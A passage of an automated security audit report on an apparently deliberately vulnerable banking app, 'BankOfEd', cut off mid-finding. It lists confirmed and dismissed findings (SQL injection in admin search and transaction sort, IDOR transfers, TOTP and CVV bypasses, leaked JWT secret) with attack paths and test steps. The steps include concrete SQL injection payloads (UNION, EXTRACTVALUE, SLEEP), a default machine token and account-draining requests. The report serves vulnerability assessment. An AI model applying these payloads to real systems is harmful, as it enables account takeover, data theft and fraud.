  "impact": "Offline password cracking (MD5 for 32-char hashes) and 2FA cloning from any response that uses toPublic, including the attacker’s own login and any victim profile retrieved via IDOR.",
  "severity_reasoning": "High (as classified): the public DTO is the secret-exfiltration sink on the main auth/profile APIs, not merely a verbose field. GET /api/profile always exposes these fields to whoever holds a (possibly forged) customer JWT.",
  "dynamic_test": "GET /api/profile with a customer Bearer token and assert data.password_hash and data.totp_secret are in the JSON. Repeat POST /api/auth/login and confirm data.user contains the same fields. After enabling TOTP, confirm totp_secret is the live seed, not redacted."
}
```

#### Validator reasoning

User::toPublic() at User.php:68-86 is the DTO used for client-facing user objects, and it explicitly copies password_hash and totp_secret. User::findById/findByEmail SELECT * so both columns are present. Concrete sinks with no stripping/encoding:

1. GET /api/profile (auth required) → ProfileController::show → Response::success(User::toPublic($auth['user'])) → json_encode.
2. PUT /api/profile → ProfileController::update → User::toPublic($updated).
3. POST /api/auth/login and POST /api/auth/register → AuthController returns { user: User::toPublic(...), token }.

Response::success json_encodes the array as-is (Helpers/Response.php:10). AuthMiddleware only proves the caller is some logged-in user; it does not redact secrets. New registrations hash with md5() (AuthService::hashPassword), so leaked hashes are immediately crackable; seeded bcrypt hashes are still offline-attackable. totp_secret is a live OTPHP secret used by TotpService::verify, so a leaked value clones 2FA. The SPA persists the full user object (including these fields) in localStorage as bankofed_user after login/register/profile load, so XSS, extensions, or disk access recover both secrets. AdminUserController already omits these fields, confirming toPublic is not a safe public projection.

Auth on GET /api/profile is not an effective control for this class: password hashes and TOTP secrets must not leave the server except a one-time TOTP enrollment response (totpSetup already returns the secret separately). Login does not even consume TOTP, so POST /api/auth/login returns the TOTP secret alongside a session token.

#### Code evidence

```
public static function toPublic(array $user): array {
    return [
        'id' => (int)$user['id'],
        ...
        'password_hash' => $user['password_hash'],
        'totp_secret'   => $user['totp_secret'],
    ];
}
ProfileController::show: Response::success(User::toPublic($auth['user']));
```

## 40. SQL injection in admin customer search

- Lead reference: ENCX-040
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:23
- Fingerprint: 31eebf1e07caa44aec75429d23f419c8f3e255cb6107c978852da9beb170f2de

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 16,
  "symbol": "$_GET['search']",
  "input": "query string search"
}
```

#### Controls encountered

```
[
  "AdminAuthMiddleware verifies a Bearer JWT (iss=BankOfEdAdmin, signature, expiry, revocation, admin_users lookup) before index() runs",
  "page/per_page/offset are cast to int, so LIMIT/OFFSET are not injectable",
  "PDO ATTR_EMULATE_PREPARES=false (does not apply to PDO::query and does not bind search)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 28,
  "symbol": "$db->query",
  "operation": "dynamic SQL with interpolated LIKE"
}
```

#### Counterevidence

```
[
  "The endpoint requires a valid admin JWT; unauthenticated callers never reach the sink unless JWT secret/credentials are already compromised",
  "UNION-based extraction is constrained because the same $where is used first in SELECT COUNT(*) (1 column) and then in a 7-column SELECT; a 7-column UNION fails the count query under ERRMODE_EXCEPTION",
  "Legitimate admins already have resetPassword, destroy, setBalance, and resetDatabase, so write impact of SQLi is partly redundant with intended admin capabilities"
]
```

#### Proof gaps

```
[
  "Stacked-query writes were not dynamically verified; PDO mysql multi-statement default is not explicitly set in AdminDatabase",
  "Production ADMIN_JWT_SECRET may differ from the hardcoded fallback, so this remains an authenticated (admin) SQLi unless that secret is weak"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker obtains an admin session: forged HS256 JWT with default ADMIN_JWT_SECRET, or login admin/admin123",
    "GET /api/admin/customers?search=… → AdminRouter auth => true → AdminAuthMiddleware",
    "AdminUserController::index interpolates unsanitized $_GET['search'] into WHERE … LIKE '%{$search}%' and runs $db->query() (not prepare)",
    "SQL executes as the admin DB user; UNION/time-based payloads can read other columns/tables (password_hash, totp_secret) that the SELECT list otherwise omits"
  ],
  "impact": "Authenticated (but trivially obtained) SQL injection in admin customer search: extract hashes, TOTP secrets, and other rows; potential writes if stacked queries are enabled.",
  "severity_reasoning": "High: classic string-concat SQLi on a privileged DB connection. Admin auth is required, but the default JWT secret and seeded admin/admin123 make that control weak.",
  "dynamic_test": "With a valid admin Bearer, GET /api/admin/customers?search=' OR 1=1 --  and confirm unfiltered listing. Then attempt a UNION payload such as search=' UNION SELECT password_hash,totp_secret,email,1,2,3,4 FROM users --  and observe extra rows/columns in data.customers. Time-based SLEEP can confirm injectability if UNION is filtered."
}
```

#### Validator reasoning

AdminUserController::index is a live handler for GET /api/admin/customers (AdminRouter.php, auth => true). It reads $_GET['search'] with no validation, escaping, or allowlist and interpolates it three times into a LIKE predicate:

$where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";

That fragment is then executed twice via PDO::query() (COUNT(*), then the 7-column SELECT). $params = [] is allocated and never used; per_page/offset are int-cast, but search is not. AdminDatabase uses a raw mysql PDO connection (ERRMODE_EXCEPTION, ATTR_EMULATE_PREPARES false). ATTR_EMULATE_PREPARES does not apply to query(), so it is not a control.

There is a concrete source-to-sink path. AdminAuthMiddleware verifies a Firebase JWT and is an authentication gate only; it does not sanitize search or force a prepared statement. After a valid admin token, payloads such as %' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password_hash FROM users LIMIT 1)))-- or boolean predicates that flip pagination.total execute as SQL.

Exploitation is not blocked by the dual-query shape: UNION is awkward because COUNT(*) is 1 column and the data query is 7, but (1) boolean-based extraction via pagination.total from the COUNT query, (2) time-based SLEEP() in the WHERE clause, and (3) error-based extraction all work. public/index.php's global catch returns $e->getMessage() plus file/line/trace, so MySQL errors (EXTRACTVALUE/UPDATEXML) are reflected to the client. Sensitive columns not in the intended SELECT (password_hash, totp_secret, accounts.card_cvv, machine_tokens, admin_users) are therefore reachable.

Stacked writes depend on PDO::MYSQL_ATTR_MULTI_STATEMENTS (not explicitly disabled) and are not required for a confirmed read SQLi. Default ADMIN_JWT_SECRET and seeded admin/admin123 raise practical exploitability but are not assumed for the verdict.

#### Code evidence

```
$search = $_GET['search'] ?? '';
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 41. SQL injection via unsanitized transaction sort column

- Lead reference: ENCX-041
- Category: A03
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:43
- Fingerprint: 01a82bb9bb85a8bfbac5a91ceac5842339f091ab8097388d3a81278eab6477b5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "query string sort"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token, but AuthService::decodeToken does not verify the JWT signature",
  "Prepared statements bind only user_id/account_id/LIMIT/OFFSET; the ORDER BY identifier is concatenated before prepare",
  "Account ownership check (Account::findByIdAndUser) applies only when account_id is present and does not constrain sort"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 43,
  "symbol": "ORDER BY t.{$sort}",
  "operation": "SQL identifier injection in ORDER BY"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Any customer JWT (including unsigned forged token) → GET /api/transactions?sort=",
    "TransactionController::index takes $_GET['sort'] with no allowlist and passes it to Transaction::findByUser",
    "findByUser interpolates ORDER BY t.{$sort} inside an otherwise prepared query — identifier is concatenated before execute",
    "Attacker injects SQL in the ORDER BY position (boolean/time-based or subquery) against the customer DB user"
  ],
  "impact": "Authenticated SQL injection allowing extraction of other users’ transactions and other tables via ORDER BY injection; reachable without a real password because customer JWTs are not verified.",
  "severity_reasoning": "High: unsanitized identifier injection on a customer-facing listing API. The prepared-statement wrapper does not bind the column name.",
  "dynamic_test": "GET /api/transactions?sort=created_at and confirm normal 200. Then GET /api/transactions?sort=created_at,(SELECT CASE WHEN (SELECT 1) THEN 1 ELSE 1 END) or a time-based payload sort=created_at AND (SELECT SLEEP(3)) -- . Confirm either extra data, a SQL error leaking structure, or a measurable delay versus a control request with sort=created_at."
}
```

#### Validator reasoning

Confirmed SQL identifier injection with a complete source-to-sink path and no effective control.

Source: GET /api/transactions is routed with auth (Router.php:79) to TransactionController::index. Line 19 assigns `$sort = $_GET['sort'] ?? 'created_at'` with no allowlist, regex, quoting, or sanitization. The value is passed unchanged into Transaction::findByUser(...).

Sink: Transaction::findByUser interpolates `$sort` into the SQL string before prepare() in both branches:
- account-scoped: `ORDER BY t.{$sort} DESC` (line 44)
- user-scoped: `ORDER BY t.{$sort} DESC` (line 59)

PDO prepare/execute only binds user_id / account_id / LIMIT / OFFSET. Identifiers cannot be parameterized, so the concatenated column name is attacker-controlled SQL. Database.php sets ATTR_EMULATE_PREPARES=false, which does not protect already-concatenated SQL.

The `t.` prefix does not block exploitation: a comma starts a second ORDER BY expression, e.g. `sort=id,(SELECT SLEEP(5))` becomes `ORDER BY t.id,(SELECT SLEEP(5)) DESC`. Error-based extraction is especially practical because public/index.php's global catch returns `$e->getMessage()` (and file/line/trace) to the client, so extractvalue/updatexml payloads leak subquery results in the JSON error body.

Reachability: a normal customer JWT is sufficient (register/login are public). Independently, AuthService::decodeToken() base64-decodes the payload and only checks exp — it never verifies the JWT signature — so a forged token with a real `sub` and unused `jti` also satisfies AuthMiddleware.

No column allowlist, no identifier quoting, and the account_id ownership check does not touch `sort`. This is exploitable authenticated (and via forged JWT) ORDER BY injection.

#### Code evidence

```
TransactionController::index:
$sort = $_GET['sort'] ?? 'created_at';
$result = Transaction::findByUser($userId, $page, $perPage, $accountId, $sort);

Transaction::findByUser:
$stmt = $db->prepare(
    "SELECT t.* FROM transactions t
     JOIN accounts a ON t.from_account_id = a.id
     WHERE a.user_id = ?
     ORDER BY t.{$sort} DESC
     LIMIT ? OFFSET ?"
);
```

## 42. IDOR: any customer can read another user's transaction by ID

- Lead reference: ENCX-042
- Category: A01
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:40
- Fingerprint: 877681e952004998fc5dc71a7ee96e7baed00c0bdf131b8d51ca014f9e2b17e0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 41,
  "symbol": "$vars['id']",
  "input": "path parameter id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid customer JWT (authentication only, no object-level check)",
  "Route constraint {id:\\d+} limits the identifier to digits"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 48,
  "symbol": "Response::success",
  "operation": "returns arbitrary transaction"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Customer (or forged unsigned JWT) → GET /api/transactions/{id}",
    "TransactionController::show loads Transaction::findById with no ownership predicate",
    "format() returns the full foreign payment record (from_account_id, destination BSB/account, amount, description)"
  ],
  "impact": "IDOR read of any customer's transaction by primary key.",
  "severity_reasoning": "Medium: same show() IDOR as ENCX-007; requires an authenticated principal but no object-level authorization.",
  "dynamic_test": "As a user who does not own transaction id 1, GET /api/transactions/1 and confirm 200 with another customer's to_bsb/to_account_number/amount. Ownership-checked GET /api/transactions?account_id=<foreign> should 404, highlighting the show() gap."
}
```

#### Validator reasoning

GET /api/transactions/{id} is a concrete IDOR. Router.php registers the route with auth=true and a digits-only id, then AuthMiddleware authenticates the caller and passes $auth into TransactionController::show. show() never reads $auth['user']['id']. It loads the row with Transaction::findById((int)$vars['id']), which is SELECT * FROM transactions WHERE id = ? with no join to accounts.user_id and no check that the caller owns from_account_id or to_account_id. The row is then returned via Response::success(Transaction::format($txn)), which includes amount, to_bsb, to_account_number, from_account_id, to_account_id, description, receipt_number, and FX fields. Transaction IDs are AUTO_INCREMENT, so any authenticated customer can enumerate them.

This is not an intended public lookup: TransactionController::index scopes via Account::findByIdAndUser / Transaction::findByUser, and sibling show() handlers (AccountController, AddressBookController) use findByIdAndUser. AuthMiddleware and the \d+ constraint only authenticate and constrain the id shape; they do not authorize object access. The frontend even exposes getTransaction(id), so the endpoint is live.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);
    if (!$txn) {
        Response::notFound('Transaction not found.');
    }
    Response::success(Transaction::format($txn));
}
```

## 43. IDOR: external transfer debits any account by ID

- Lead reference: ENCX-043
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:175
- Fingerprint: f28bd087908b90d5218f07182edc73581fdab080130dd47cd335b348ef3369db

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 113,
  "symbol": "$data['from_account_id']",
  "input": "JSON from_account_id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a customer JWT but does not bind the source account to that user",
  "AddressBookEntry::findByIdAndUser only applies when address_book_id is supplied; the manual BSB/account-number path is attacker-controlled",
  "TOTP is marked required for manual transfers but is skipped when totp is not configured or when totp_code is omitted"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 175,
  "symbol": "Account::findById",
  "operation": "debit arbitrary account then updateBalance"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Any customer JWT → POST /api/transfers/external with attacker-chosen from_account_id",
    "TransferService::transferExternal resolves source via Account::findById instead of findByIdAndUser (VULNERABILITY #23)",
    "Balance is decremented on that unscope-checked id and funds are sent to attacker BSB/account; transferOwn correctly uses findByIdAndUser so this is specific to the external path"
  ],
  "impact": "Drain any customer's account to an attacker-controlled payee. Combined with no remaining-balance check, overdraft is unlimited.",
  "severity_reasoning": "High: object-level authorization missing on the external money-movement source account.",
  "dynamic_test": "Login/forge user 2. POST /api/transfers/external from_account_id=4 (Wei's own would be 4/5 — use id 1 belonging to user 1), attacker to_bsb/to_account_number, amount 50. Confirm 201 and victim account 1 debit. Repeat transferOwn with from_account_id=1 and expect 404 Source account not found."
}
```

#### Validator reasoning

POST /api/transfers/external is registered with customer JWT auth only. TransactionController::transferExternal takes attacker-controlled JSON from_account_id and passes it to TransferService::transferExternal, which resolves the source with Account::findById($fromAccountId) rather than findByIdAndUser. There is no subsequent user_id / ownership comparison. The same method then unconditionally Account::updateBalance($fromAccountId, '-' . $debitAmount) and, on the manual path, credits attacker-supplied to_bsb/to_account_number (or an internal account matching those details). transferOwn in the same class correctly uses findByIdAndUser, so this is a specific omission. TOTP is not a blocking control: checkTotpRequired marks manual transfers as required, but if totp_enabled is false the transfer proceeds, and if totp is enabled but totp_code is omitted the verify branch is skipped. There is also no source-account is_active or balance check on this path. Account IDs are auto-increment integers, registration is public, and AuthMiddleware only proves the caller has any valid customer JWT. Concrete source-to-sink: JSON from_account_id -> TransactionController::transferExternal -> TransferService::transferExternal -> Account::findById -> Account::updateBalance debit.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
// VULNERABILITY #9: No balance check on external transfers
Account::updateBalance($fromAccountId, '-' . $debitAmount);
```

## 44. TOTP required for external transfers can be skipped by omitting the code

- Lead reference: ENCX-044
- Category: A07
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:237
- Fingerprint: dce7d9c9e69c28c1695bd47d2b7502e1046c37fcea3680d19b564b0b6f5cfd3f

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 122,
  "symbol": "$data['totp_code']",
  "input": "optional JSON totp_code"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid session JWT but does not perform TOTP/step-up",
  "checkTotpRequired marks manual and first-time address-book transfers as required, but the result is not used as a hard gate",
  "TotpService::verify is invoked only when totp_code is non-empty; invalid codes are rejected via Response::forbidden/exit",
  "totp_verified is persisted on the transaction and used to mark address-book payees verified, but a false value does not prevent completion",
  "Profile totpVerify/totpDisable correctly require and verify a TOTP code (different path)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 237,
  "symbol": "totpCheck",
  "operation": "external transfer commits without TOTP"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/transfers/external for a manual or first-time address-book payee",
    "checkTotpRequired marks TOTP required, but enforcement is fail-open: totp_enabled=0 proceeds; totp_enabled=1 with omitted totp_code skips the verify() call and leaves totpVerified=false",
    "Transfer commits anyway; ProfileController totp enable/disable correctly requires TotpService::verify, so only the money-movement path is broken"
  ],
  "impact": "Skip 2FA on high-risk external transfers using a stolen or forged session.",
  "severity_reasoning": "High: step-up authentication on fund disbursement does not fail closed when the code is missing.",
  "dynamic_test": "On a totp_enabled user, POST /api/transfers/external to a new manual payee with totp_code omitted (key absent). Expect 201 totp_verified=false. Send totp_code=000000 and expect 403 TOTP_INVALID. On a user with totp_enabled=0, the same manual transfer should also 201."
}
```

#### Validator reasoning

Confirmed: POST /api/transfers/external can complete a TOTP-required external transfer without a second factor. TransactionController::transferExternal does not validate totp_code (it is passed as `$data['totp_code'] ?? null`). TransferService::transferExternal then calls checkTotpRequired, which returns required=true for every manual payee and every unverified address-book payee. The enforcement block only rejects an *invalid supplied* code via TotpService::verify; if totp_enabled is false, or totp_enabled is true but totp_code is omitted/empty, totpVerified stays false and execution falls through. The transfer then deducts the source balance and inserts a completed transaction. Response::forbidden exits only on a failed verify, so it is not a blocking control for the omit path. AuthMiddleware only checks a bearer session; login itself never prompts for TOTP. Profile totpVerify/totpDisable correctly require a code, which demonstrates the intended TotpService control is simply not applied on the money-movement path. An attacker with a stolen (or password-only) session can therefore send funds to a new/manual destination by omitting totp_code.

#### Code evidence

```
if ($totpCheck['required']) {
    if (!$user['totp_enabled']) {
        $totpVerified = false; // proceeds
    } elseif (!empty($totpCode)) {
        if (!TotpService::verify($user['totp_secret'], $totpCode, $user['email'])) {
            Response::forbidden('TOTP_INVALID', 'Invalid TOTP code. Please try again.');
        }
        $totpVerified = true;
    }
    // else: totp required, enabled, but code omitted → still succeeds
}
```

## 45. Card payments skip CVV verification when the field is omitted

- Lead reference: ENCX-045
- Category: A07
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/PaymentController.php:85
- Fingerprint: 7511381f68048798ad7b6a8aa2e477037f097b9e2919607a669cceab44e0c5f9

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 84,
  "symbol": "$data['cvv']",
  "input": "optional JSON cvv/cvc"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a Bearer machine token, but the default/seeded token mch_face_insurance_secret_key_2026 is accepted via config fallback, MachineToken::validateToken fallback, and install/seed.sql",
  "Validator requires merchant_id, card_number, expiry, amount only; cvv/cvc is optional",
  "Luhn, stored-expiry match, merchant is_active, card is_active, and available-balance checks run regardless of CVV and do not block an omitted CVV"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 106,
  "symbol": "Account::updateBalance",
  "operation": "debit card account without CVV"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker uses default/hardcoded machine token mch_face_insurance_secret_key_2026 → MachineAuthMiddleware",
    "POST /api/payments/process with merchant_id, card_number, expiry, amount — cvv/cvc omitted",
    "PaymentController::process validates Luhn, lookup by PAN, expiry match, and balance; CVV is compared only when stored CVV is non-empty AND the request actually sent cvv/cvc",
    "Charge proceeds; Account::updateBalance debits the card and credits the merchant"
  ],
  "impact": "Charge customer cards with PAN+expiry only (no CVV) via the public machine token, enabling card-not-present fraud.",
  "severity_reasoning": "Medium: CVV is an intended card-present/CNP control that is skippable by omission; still needs PAN and expiry, but those leak from the unauthenticated export and toPublic-adjacent account data.",
  "dynamic_test": "POST /api/payments/process with Bearer mch_face_insurance_secret_key_2026, a seeded card PAN and matching expiry, valid merchant_id, amount > 0, and no cvv field. Confirm 200 receipt. Repeat with wrong cvv and confirm decline, proving the check exists only when the field is present."
}
```

#### Validator reasoning

POST /api/payments/process is a live FastRoute handler (Router.php:71) behind MachineAuthMiddleware. PaymentController::process validates only merchant_id, card_number, expiry, and amount — cvv/cvc is not required. After Luhn, card lookup, calendar expiry, and stored-expiry match, CVV is compared only inside `if (!empty($cardAccount['card_cvv']) && $inputCvv !== '')`. Omitting cvv/cvc (or sending whitespace) makes `$inputCvv === ''`, so the stored CVV is never compared. Execution then reaches Account::updateBalance and credits the merchant. Response::error exits, so there is no later catch that restores the check.

This is not dead code. Newly issued credit cards always get a generated CVV (AccountController::store), and seed.sql inserts 15 cards with non-empty card_cvv (e.g. 4532015001345674 / 08/29 / 842). Machine auth authenticates the caller, not the cardholder; process() never uses $auth after the middleware. The default token `mch_face_insurance_secret_key_2026` is the config fallback, the MachineToken::validateToken fallback, and the seeded machine_tokens row, so it is usable on the Docker/seeded deployment. Combined with public seed PANs and merchant_id `faceinsurance`, an attacker can charge a card with PAN+expiry only.

Machine auth, Luhn, expiry match, merchant-active, and balance checks do not substitute for CVV: they still succeed when CVV is omitted. This is a cardholder-authentication skip on a card-not-present charge, not an intended MIT/recurring stored-credential flow (the request still supplies a raw PAN each time).

#### Code evidence

```
$inputCvv = trim($data['cvv'] ?? $data['cvc'] ?? '');
if (!empty($cardAccount['card_cvv']) && $inputCvv !== '') {
    if ($inputCvv !== $cardAccount['card_cvv']) {
        Response::error('PAYMENT_DECLINED', '...', 400);
    }
}
// if inputCvv === '', stored CVV is never checked
Account::updateBalance((int)$cardAccount['id'], '-' . $amount);
```

## 46. Payments transfer API does not authenticate the source account holder

- Lead reference: ENCX-046
- Category: A01
- Severity: HIGH
- Confidence: 86%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/src/Controllers/PaymentController.php:180
- Fingerprint: 9162e319406e789e2a0f1287e1eb1f6b2fc0ecb87a1eec3715cb56849663dbdd

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 163,
  "symbol": "$data['from_bsb']",
  "input": "JSON from_bsb and from_account_number"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a valid Bearer machine token",
  "Source-account allowlist for token names face_insurance and configured_machine_token (PaymentController.php:188-194); Response::error exits with 403",
  "Seeded token name face_insurance and fallback name configured_machine_token both enter that allowlist",
  "Source must exist and be active; BSB format and balance checks"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 229,
  "symbol": "Account::updateBalance",
  "operation": "debit source account identified only by BSB/number"
}
```

#### Counterevidence

```
[
  "PaymentController.php:188-194 applies UNAUTHORIZED_ACCOUNT for face_insurance and configured_machine_token unless source id is the faceinsurance merchant account or user_id is 16",
  "MachineToken::validateToken returns DB name face_insurance for the seeded secret before any fallback",
  "Fallback explicitly sets name configured_machine_token, which is also allowlisted",
  "install/seed.sql inserts only one machine_tokens row (name face_insurance); user 16 owns only account 100",
  "No MachineToken create/insert path or admin token-management route exists in the repository",
  "Response::error() calls exit, so the 403 cannot fall through to updateBalance"
]
```

#### Proof gaps

```
[
  "A DBA-inserted machine_tokens row with any other name would skip the allowlist; that credential does not exist in this tree"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

The claimed A01 is that POST /api/payments/transfer debits a source account identified only by attacker-supplied BSB and account number, with machine-token authorization that does not bind the caller to that account (and that any non-allowlisted token can drain every account).

The handler does resolve the source solely via Account::findByBsbAndNumber, and the comment/README language about “authenticating the account holder” is inaccurate. That is not enough to confirm the finding.

MachineAuthMiddleware is mandatory for this route. Every token the application can actually issue or accept is then bound to FACE Insurance accounts:

- Seed inserts a single active token named face_insurance whose secret is mch_face_insurance_secret_key_2026. validateToken prefers the DB row, so that secret authenticates as name face_insurance.
- The config fallback, used only when the presented secret is not in the table, returns name configured_machine_token.
- transfer() runs the source-account allowlist for both of those names and Response::error() exits on 403. The only permitted sources are the faceinsurance merchant account (id 100 / 062-001 88880001) or user_id 16 (the seeded FACE Insurance merchant user, who owns only that account).

There is no other machine_tokens insert, no MachineToken create/update API, and no admin route to mint tokens. An unseeded install has no accounts to debit. Therefore an attacker with the well-known default secret cannot debit customer accounts; 403 UNAUTHORIZED_ACCOUNT is a hard stop.

Debiting the FACE settlement account with that same secret is the intended merchant-token binding, not missing source-holder authorization. Exposure of the default secret is a separate credentials issue, not this A01. The allowlist is fail-open for hypothetical unnamed DB tokens, but no such token exists in-tree (recorded as an adjacent concern, not this finding).

#### Code evidence

```
$sourceAccount = Account::findByBsbAndNumber($fromBsb, $fromAccountNum);
$machineName = $auth['machine']['name'] ?? '';
if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') {
    $merchant = Merchant::findByMerchantId('faceinsurance');
    $allowedAccountId = $merchant ? (int)$merchant['account_id'] : 100;
    if ((int)$sourceAccount['id'] !== $allowedAccountId && (int)$sourceAccount['user_id'] !== 16) {
        Response::error('UNAUTHORIZED_ACCOUNT', '...', 403);
    }
}
Account::updateBalance((int)$sourceAccount['id'], '-' . $amount);
```

## 47. Unauthenticated /api/health discloses JWT secret and database credentials

- Lead reference: ENCX-047
- Category: A02
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:32
- Fingerprint: deebb2c0c60d6e86c026fc74cd0c199194c5b58f55f1cf2e9e7cd84e8c1ba594

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 24,
  "symbol": "health",
  "input": "unauthenticated GET /api/health"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Helpers/Response.php",
  "line": 10,
  "symbol": "json_encode",
  "operation": "public JSON includes jwt_secret"
}
```

#### Counterevidence

```
[
  "db_pass is not included in the health payload (only db_host, db_name, db_user, jwt_secret)."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated GET /api/health (Router auth => false)",
    "Router::health() reads config/app.php jwt_secret, db_host, db_name, db_user",
    "Response::success JSON-echoes the HMAC key and DB identity to any internet client — the A02 sink is the JSON output of secrets, not merely missing auth"
  ],
  "impact": "Live customer JWT secret and database targeting data disclosed; pairs with decodeToken not verifying signatures and with forging if verification were enabled.",
  "severity_reasoning": "High: the JSON response is a cryptographic-secret oracle reachable with a single GET.",
  "dynamic_test": "curl GET /api/health with no cookies/headers. Confirm data.jwt_secret is present (default bankofed-dev-secret-change-in-production when unset) alongside db_host/db_name/db_user. This is the Response.php echo sink."
}
```

#### Validator reasoning

Unauthenticated GET /api/health is a live public route that serializes jwt_secret plus DB host/name/user into a JSON response. public/index.php sends all /api/* traffic into Router::dispatch(); the route is registered with auth => false, so neither AuthMiddleware nor MachineAuthMiddleware runs. Router::health() require()s config/app.php and passes $config['jwt_secret'], db_host, db_name, and db_user into Response::success(), which echo json_encode()s the payload and exits. No IP allowlist, debug flag, or environment redaction exists. jwt_secret is the HS256 HMAC key used by AuthService::createToken, so a network-reachable caller can recover the live signing secret (including a non-default JWT_SECRET from .env) and forge customer tokens. CORS reflects any Origin, so the leak is also browser-reachable. db_pass is not included, but that does not block the jwt_secret disclosure.

#### Code evidence

```
Router::health():
Response::success([
    'status' => 'ok',
    'db_host' => $config['db_host'],
    'db_name' => $config['db_name'],
    'db_user' => $config['db_user'],
    'jwt_secret' => $config['jwt_secret'],
    'environment' => getenv('APP_ENV') ?: 'production',
]);
Route: GET /api/health auth => false
```

## 48. SQL injection via unsanitized sort parameter in transaction listing

- Lead reference: ENCX-048
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:47
- Fingerprint: 87e2af1cb82a4d84ca9f4751fb1fb00e08e6254e6c41c3f1bf3644404d024a7c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "query parameter sort"
}
```

#### Controls encountered

```
[
  "JWT authentication required (AuthMiddleware) — does not constrain sort",
  "Optional account_id ownership check via Account::findByIdAndUser — does not sanitize sort",
  "PDO bound parameters for IDs/LIMIT/OFFSET — do not cover the interpolated ORDER BY identifier",
  "PDO ATTR_EMULATE_PREPARES=false — interpolation occurs before prepare()"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 47,
  "symbol": "$stmt->execute([$accountId, $accountId, $perPage, $offset]);",
  "operation": "PDO execute of SQL with interpolated ORDER BY"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker obtains a customer JWT via public POST /api/auth/register",
